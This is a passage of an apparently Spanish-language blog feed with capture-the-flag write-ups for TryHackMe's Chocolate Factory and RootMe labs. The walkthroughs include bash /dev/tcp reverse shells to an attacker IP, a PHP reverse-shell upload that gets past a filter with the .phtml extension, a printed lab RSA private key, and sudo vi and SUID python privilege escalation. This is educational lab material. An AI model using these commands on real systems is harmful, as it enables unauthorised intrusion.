+	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-chocolate-factory/images/remote_hud27725407893b15b7d96a74ea8ab70cd_217590_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-chocolate-factory/images/remote_hud27725407893b15b7d96a74ea8ab70cd_217590_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;182&#34;
+		data-flex-basis=&#34;438px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Desde aquí se pueden ejecutar comandos a la máquina víctima.&lt;/p&gt;
+&lt;h2 id=&#34;reverse-shell&#34;&gt;Reverse shell&lt;/h2&gt;
+&lt;p&gt;Primero nos ponemos en escucha por el puerto 443&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;nc -nlvp 443
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Intentamos crear una reverse shell mandando &lt;code&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.10.10/443 0&amp;gt;&amp;amp;1&lt;/code&gt;, pero no recibimos nada, probamos añadiendo (bash -c &amp;ldquo;&amp;rdquo;) de tal forma que quede así &lt;code&gt;bash -c &amp;quot;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.10.10/443 0&amp;gt;&amp;amp;1&amp;quot;&lt;/code&gt; Ahora ya si&lt;/p&gt;
+&lt;h2 id=&#34;tratamiento-de-la-tty&#34;&gt;Tratamiento de la tty&lt;/h2&gt;
+&lt;p&gt;Antes para trabajar mejor vamos a hacer un tratamiento de la terminal con los siguientes comandos:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;script /dev/null -c bash
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;ctrl + z&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;stty raw -echo; fg
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;reset
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;xterm
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;export SHELL=bash
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;export TERM=xterm
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;escalada-a-charlie&#34;&gt;Escalada a charlie&lt;/h2&gt;
+&lt;p&gt;En el /home/charlie hay un user.txt, pero no tenemos acceso para leerlo. Hay un archivo llamado teleport ahí hay una RSA private key.&lt;/p&gt;
+&lt;p&gt;Una llave RSA es una llave generada por el algoritmo RSA. Esta llave está compuesta por dos partes, una parte pública y otra parte privada.&lt;/p&gt;
+&lt;p&gt;Desde nuestra máquina guardamos esa key en un archivo llamado id_rsa&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;❯ cat id_rsa
+───────┬──────────────────────────────────────────────────────────────────────────────────
+       │ File: id_rsa
+───────┼──────────────────────────────────────────────────────────────────────────────────
+   1   │ -----BEGIN RSA PRIVATE KEY-----
+   2   │ MIIEowIBAAKCAQEA4adrPc3Uh98RYDrZ8CUBDgWLENUybF60lMk9YQOBDR+gpuRW
+   3   │ 1AzL12K35/Mi3Vwtp0NSwmlS7ha4y9sv2kPXv8lFOmLi1FV2hqlQPLw/unnEFwUb
+   4   │ L4KBqBemIDefV5pxMmCqqguJXIkzklAIXNYhfxLr8cBS/HJoh/7qmLqrDoXNhwYj
+   5   │ B3zgov7RUtk15Jv11D0Itsyr54pvYhCQgdoorU7l42EZJayIomHKon1jkofd1/oY
+   6   │ fOBwgz6JOlNH1jFJoyIZg2OmEhnSjUltZ9mSzmQyv3M4AORQo3ZeLb+zbnSJycEE
+   7   │ RaObPlb0dRy3KoN79lt+dh+jSg/dM/TYYe5L4wIDAQABAoIBAD2TzjQDYyfgu4Ej
+   8   │ Di32Kx+Ea7qgMy5XebfQYquCpUjLhK+GSBt9knKoQb9OHgmCCgNG3+Klkzfdg3g9
+   9   │ zAUn1kxDxFx2d6ex2rJMqdSpGkrsx5HwlsaUOoWATpkkFJt3TcSNlITquQVDe4tF
+  10   │ w8JxvJpMs445CWxSXCwgaCxdZCiF33C0CtVw6zvOdF6MoOimVZf36UkXI2FmdZFl
+  11   │ kR7MGsagAwRn1moCvQ7lNpYcqDDNf6jKnx5Sk83R5bVAAjV6ktZ9uEN8NItM/ppZ
+  12   │ j4PM6/IIPw2jQ8WzUoi/JG7aXJnBE4bm53qo2B4oVu3PihZ7tKkLZq3Oclrrkbn2
+  13   │ EY0ndcECgYEA/29MMD3FEYcMCy+KQfEU2h9manqQmRMDDaBHkajq20KvGvnT1U/T
+  14   │ RcbPNBaQMoSj6YrVhvgy3xtEdEHHBJO5qnq8TsLaSovQZxDifaGTaLaWgswc0biF
+  15   │ uAKE2uKcpVCTSewbJyNewwTljhV9mMyn/piAtRlGXkzeyZ9/muZdtesCgYEA4idA
+  16   │ KuEj2FE7M+MM/+ZeiZvLjKSNbiYYUPuDcsoWYxQCp0q8HmtjyAQizKo6DlXIPCCQ
+  17   │ RZSvmU1T3nk9MoTgDjkNO1xxbF2N7ihnBkHjOffod+zkNQbvzIDa4Q2owpeHZL19
+  18   │ znQV98mrRaYDb5YsaEj0YoKfb8xhZJPyEb+v6+kCgYAZwE+vAVsvtCyrqARJN5PB
+  19   │ la7Oh0Kym+8P3Zu5fI0Iw8VBc/Q+KgkDnNJgzvGElkisD7oNHFKMmYQiMEtvE7GB
+  20   │ FVSMoCo/n67H5TTgM3zX7qhn0UoKfo7EiUR5iKUAKYpfxnTKUk+IW6ME2vfJgsBg
+  21   │ 82DuYPjuItPHAdRselLyNwKBgH77Rv5Ml9HYGoPR0vTEpwRhI/N+WaMlZLXj4zTK
+  22   │ 37MWAz9nqSTza31dRSTh1+NAq0OHjTpkeAx97L+YF5KMJToXMqTIDS+pgA3fRamv
+  23   │ ySQ9XJwpuSFFGdQb7co73ywT5QPdmgwYBlWxOKfMxVUcXybW/9FoQpmFipHsuBjb
+  24   │ Jq4xAoGBAIQnMPLpKqBk/ZV+HXmdJYSrf2MACWwL4pQO9bQUeta0rZA6iQwvLrkM
+  25   │ Qxg3lN2/1dnebKK5lEd2qFP1WLQUJqypo5TznXQ7tv0Uuw7o0cy5XNMFVwn/BqQm
+  26   │ G2QwOAGbsQHcI0P19XgHTOB7Dm69rP9j1wIRBOF7iGfwhWdi+vln
+  27   │ -----END RSA PRIVATE KEY-----
+───────┴──────────────────────────────────────────────────────────────────────────────────
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Ahora nos podemos conectar por ssh como charlie&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;ssh -i id_rsa charlie@10.10.94.87
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Ya somos charlie y podemos ver la flag de usuario&lt;/p&gt;
+&lt;h2 id=&#34;escalada-root&#34;&gt;Escalada root&lt;/h2&gt;
+&lt;p&gt;Con &lt;code&gt;sudo -l&lt;/code&gt; podemos ver todos los comandos que charlie puede ejecutar. Ahí podemos ver que el /usr/bin/vi lo puede ejecutar con sudo sin proporcionar contraseña&lt;/p&gt;
+&lt;p&gt;vi (Visual) es un programa que entra en la categoría de los editores de texto, pues a diferencia de un procesador de texto no ofrece herramientas para determinar visualmente cómo quedará el documento impreso. Por esto carece de opciones como centrado o justificación de párrafos, pero permite mover, copiar, eliminar o insertar caracteres con mucha versatilidad. Este tipo de programas es frecuentemente utilizado por programadores para escribir código.&lt;/p&gt;
+&lt;p&gt;Ejecutar vi como root&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;sudo vi&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;ctrl + c&lt;/p&gt;
+&lt;p&gt;Y por último escribir :shell en la linea de abajo&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;:shell&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-chocolate-factory/images/root.png&#34;
+	width=&#34;887&#34;
+	height=&#34;1000&#34;
+	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-chocolate-factory/images/root_hub0a3254ffb2d65b16ba2d1c32daea127_98997_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-chocolate-factory/images/root_hub0a3254ffb2d65b16ba2d1c32daea127_98997_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;88&#34;
+		data-flex-basis=&#34;212px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;¡Ya somos root!&lt;/p&gt;
+&lt;h2 id=&#34;rootpy-puertos-100---125&#34;&gt;root.py (Puertos 100 - 125)&lt;/h2&gt;
+&lt;p&gt;En el directorio /root  hay un archivo llamado root.py el cual al ejecutarlo &lt;code&gt;pyhton root.py&lt;/code&gt; pide una key: Volviendo al nmap que encontró 25 puertos tcp en los cuales todos pone lo mismo:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .&#39;__&#39;__&#39;__&#39;__&#39;__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__&#39;__&#39;_`.__| `. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__\x20__&#39;_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Menos uno, el 113, que pone:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;http://localhost/key_rev_key &amp;lt;- You will find the key here!!!
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Cuando entramos al &lt;code&gt;http://10.10.94.87/key_rev_key&lt;/code&gt; nos descarga un archivo llamado &lt;code&gt;key_rev_key&lt;/code&gt;, al abrirlo nos pide un nombre, e probado con charlie, Mr.Wonka, root, admin, etc&amp;hellip; pero nada.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;chmod +x key_rev_key
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;❯ ./key_rev_key
+Enter your name: charlie
+Bad name!
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Al hacer un nano al archivo hay una línea que pone:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;congratulations you have found the key:   ^@^@^@^@b&#39;-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=&#39;^@`
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;¡Ya tenemos la key!&lt;/p&gt;
+&lt;p&gt;También hay otra línea en la cual se puede ver el nombre correcto&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;Enter your name: �%s� laksdhfas��
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;❯ ./key_rev_key
+Enter your name: laksdhfas
+
+ congratulations you have found the key:   b&#39;-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=&#39;
+ Keep its safe
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;root-flag&#34;&gt;Root flag&lt;/h2&gt;
+&lt;p&gt;Ahora ya podemos ejecutar el &lt;code&gt;root.py&lt;/code&gt; que está en &lt;code&gt;/root&lt;/code&gt; y poner la key.&lt;/p&gt;
+&lt;p&gt;¡Nos responde con la flag de root!&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>Resolución CTF RootMe</title>
+        <link>https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-rootme/</link>
+        <pubDate>Sun, 11 Dec 2022 00:00:00 +0000</pubDate>
+        
+        <guid>https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-rootme/</guid>
+        <description>&lt;img src="https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-rootme/images/7.jpg" alt="Featured image of post Resolución CTF RootMe" /&gt;&lt;p&gt;Un ctf para principiantes, me puedes rootear?&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://tryhackme.com/room/rrootme&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://tryhackme.com/room/rrootme&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;IP Atacante = 10.10.10.10&lt;/p&gt;
+&lt;p&gt;IP víctima = 10.10.108.243&lt;/p&gt;
+&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
+&lt;p&gt;Para empezar lo primero es comprobar si la máquina está activa y que OS tiene&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;❯ ping -c 1 10.10.108.243
+PING 10.10.108.243 (10.10.108.243) 56(84) bytes of data.
+64 bytes from 10.10.108.243: icmp_seq=1 ttl=63 time=77.9 ms
+
+--- 10.10.108.243 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 77.935/77.935/77.935/0.000 ms
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;En este caso da un ttl (time to live) de &lt;strong&gt;63&lt;/strong&gt;, entendiendo que &lt;strong&gt;ttl=64: Linux&lt;/strong&gt; / &lt;strong&gt;ttl=128: Windows&lt;/strong&gt;. Esta máquina es &lt;strong&gt;Linux&lt;/strong&gt; por aproximación&lt;/p&gt;
+&lt;h3 id=&#34;escaneo-de-puertos-nmap&#34;&gt;Escaneo de puertos (nmap)&lt;/h3&gt;
+&lt;p&gt;Ahora empezamos con un escaneo de puertos&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;nmap -p- --open -sS --min-rate 5000 -n -vvv -Pn 10.10.108.243 -oG allPort
+&lt;/code&gt;&lt;/pre&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Parámetro&lt;/th&gt;
+&lt;th&gt;Función&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;-p-&lt;/td&gt;
+&lt;td&gt;Para que el escaneo sea a todos los puertos (65536)&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&amp;ndash;open&lt;/td&gt;
+&lt;td&gt;Para que solo reporte los puertos abiertos&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-sS &amp;ndash;min-rate 5000&lt;/td&gt;
+&lt;td&gt;Definir el tiempo del escaneo&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-n&lt;/td&gt;
+&lt;td&gt;Omitir resolución DNS&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-vvv&lt;/td&gt;
+&lt;td&gt;Para que vaya reportando lo que encuentre por consola&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-Pn&lt;/td&gt;
+&lt;td&gt;Skip host discovery&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-oG allPorts&lt;/td&gt;
+&lt;td&gt;Para que guarde el escaneo en format grepeable en un archivo llamado allPort&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://pastebin.com/tYpwpauW&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Función extractPorts&lt;/a&gt; de &lt;a class=&#34;link&#34; href=&#34;https://s4vitar.github.io&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;@s4vitar&lt;/a&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;❯ extractPorts allPort
+───────┬────────────────────────────────────────────────────────
+       │ File: extractPorts.tmp
+───────┼────────────────────────────────────────────────────────
+   1   │ 
+   2   │ [*] Extracting information...
+   3   │ 
+   4   │     [*] IP Address: 10.10.108.243
+   5   │     [*] Open ports: 22,80
+   6   │ 
+   7   │ [*] Ports copied to clipboard
+   8   │ 
+───────┴────────────────────────────────────────────────────────
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts básicos de reconocimientos&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;❯ nmap -p22,80 -sC -sV 10.10.108.243 -oN target
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 4ab916884c25448ba5cfd3f2252214 (RSA)
+|   256 a9a686e8ec963f003cd16d54973082 (ECDSA)
+|_  256 22f6b5a654d9787c26035a953f9dfcd (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: HackIT - Home
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&#34;web&#34;&gt;Web&lt;/h3&gt;
+&lt;p&gt;Con el whateb podemos ver info sobre a web&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;❯ whatweb 10.10.108.243
+http://10.10.108.243 [200 OK] Apache[2.4.29], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.108.243], Script, Title[HackIT - Home]
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Al entrar a la web solo se ve texto&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-rootme/images/rootme.png&#34;
+	width=&#34;1288&#34;
+	height=&#34;593&#34;
+	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-rootme/images/rootme_hu5665040edcd268205a664a1af8498659_25861_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-rootme/images/rootme_hu5665040edcd268205a664a1af8498659_25861_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;217&#34;
+		data-flex-basis=&#34;521px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h4 id=&#34;buscando-subdirectorios-wfuzz&#34;&gt;Buscando subdirectorios (wfuzz)&lt;/h4&gt;
+&lt;p&gt;Para ver si hay subdirectorios vamos a usar la herramienta wfuzz para fusear mediante un diccionario que está en &lt;code&gt;/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt&lt;/code&gt; con el siguiente comando:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.108.243/FUZZ
+&lt;/code&gt;&lt;/pre&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Parámetro&lt;/th&gt;
+&lt;th&gt;Función&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;-c&lt;/td&gt;
+&lt;td&gt;Para que lo reporte todo con colores&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-t&lt;/td&gt;
+&lt;td&gt;Para configurar el tiempo&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&amp;ndash;hc=404&lt;/td&gt;
+&lt;td&gt;Para que no nos reporte los subdirectorios que no existan&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-w&lt;/td&gt;
+&lt;td&gt;Es donde se indica el diccionario&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;FUZZ&lt;/td&gt;
+&lt;td&gt;Se escribe donde quieres aplicar el diccionario&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;El wfuzz nos reporta lo siguiente&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;=====================================================================
+ID           Response   Lines    Word       Chars       Payload                  
+=====================================================================
+000000550:   301        9 L      28 W       312 Ch      &amp;quot;css&amp;quot;
+000000953:   301        9 L      28 W       311 Ch      &amp;quot;js&amp;quot;                     
+000005520:   301        9 L      28 W       314 Ch      &amp;quot;panel&amp;quot;                  
+000000164:   301        9 L      28 W       316 Ch      &amp;quot;uploads&amp;quot;
+000095524:   403        9 L      28 W       278 Ch      &amp;quot;server-status&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Al entrar al /panel se ve un sitio para subir archivos&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-rootme/images/upload.png&#34;
+	width=&#34;784&#34;
+	height=&#34;431&#34;
+	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-rootme/images/upload_hu278b080b4d35e596917f41312a93f175_21808_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-rootme/images/upload_hu278b080b4d35e596917f41312a93f175_21808_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;181&#34;
+		data-flex-basis=&#34;436px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Probamos con subir una foto random, y vemos que aparece en el /uploads&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-rootme/images/uploads.png&#34;
+	width=&#34;380&#34;
+	height=&#34;248&#34;
+	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-rootme/images/uploads_hu215178249d635ff96931ac571d426b42_20226_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-rootme/images/uploads_hu215178249d635ff96931ac571d426b42_20226_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;153&#34;
+		data-flex-basis=&#34;367px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h2 id=&#34;vulnerabilidad-web&#34;&gt;Vulnerabilidad web&lt;/h2&gt;
+&lt;p&gt;Viendo esto vamos a intentar subir un archivo .php para crear una reverse shell, este archivo es de pentestmonkey &lt;a class=&#34;link&#34; href=&#34;https://github.com/pentestmonkey/php-reverse-shell&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://github.com/pentestmonkey/php-reverse-shell&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Primero lo pasamos a nuestra máquina&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;git clone https://github.com/pentestmonkey/php-reverse-shell 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Después nos ponemos en escucha por el puerto 443&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;nc -nlvp 443
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Y ahora lo subimos el archivo a /panel&lt;/p&gt;
+&lt;p&gt;¡Error!&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-rootme/images/error-php.png&#34;
+	width=&#34;675&#34;
+	height=&#34;576&#34;
+	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-rootme/images/error-php_hud804123877fee4a46e198468309b463a_31420_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-rootme/images/error-php_hud804123877fee4a46e198468309b463a_31420_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;117&#34;
+		data-flex-basis=&#34;281px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;No acepta archivos php, Los administradores pueden hacer una lista negra de extensiones de archivos específicas y evitar que los usuarios carguen archivos con extensiones que se consideran peligrosas. Esto se puede omitir mediante el uso de extensiones alternativas o incluso no relacionadas.&lt;/p&gt;
+&lt;p&gt;Ejemplo extensiones php &amp;mdash;&amp;gt; .phtml, .php3, .php4, .php5&lt;/p&gt;
+&lt;p&gt;Vamos a probar con la primera (.phtml), le cambiamos el nombre al archivo, de &lt;code&gt;php-reverse-shell.php&lt;/code&gt; a &lt;code&gt;php-reverse-shell.phtml&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-rootme/images/upload-good.png&#34;
+	width=&#34;696&#34;
+	height=&#34;566&#34;
+	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-rootme/images/upload-good_hud323d254a3cc62622e1e6e0ae32f42cf_38983_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-rootme/images/upload-good_hud323d254a3cc62622e1e6e0ae32f42cf_38983_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;122&#34;
+		data-flex-basis=&#34;295px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Ahora ya le gusta&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-rootme/images/uploads2.png&#34;
+	width=&#34;437&#34;
+	height=&#34;235&#34;
+	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-rootme/images/uploads2_hu6a993dd588174aabe193694c1a502081_24290_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-rootme/images/uploads2_hu6a993dd588174aabe193694c1a502081_24290_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;185&#34;
+		data-flex-basis=&#34;446px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Desde /uploads le damos al archivo que hemos subido y recibimos una conexión&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;❯ nc -nlvp 443
+listening on [any] 443 ...
+connect to [10.10.10.10] from (UNKNOWN) [10.10.108.243] 37418
+Linux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+ 13:52:50 up 48 min,  0 users,  load average: 0.00, 0.00, 0.05
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can&#39;t access tty; job control turned off
+$ 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;tratamiento-de-tty&#34;&gt;Tratamiento de tty&lt;/h2&gt;
+&lt;p&gt;Antes para trabajar mejor vamos a hacer un tratamiento de la terminal con los siguientes comandos:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;script /dev/null -c bash
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;ctrl + z&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;stty raw -echo; fg
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;reset
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;xterm
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;export SHELL=bash
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;export TERM=xterm
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;flags&#34;&gt;Flags&lt;/h2&gt;
+&lt;p&gt;En &lt;code&gt;/var/www&lt;/code&gt;esta la primera flag &lt;code&gt;user.txt&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;La flag de root está en el /root, pero no tenemos permisos para acceder, Con el comando history, se pueden ver dos comandos interesantes&amp;hellip;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;10  find / -perm /4000
+11  python -c &#39;import os; os.execl(&amp;quot;/bin/sh&amp;quot;, &amp;quot;sh&amp;quot;, &amp;quot;-p&amp;quot;)&#39;
+&lt;/code&gt;&lt;/pre&gt;
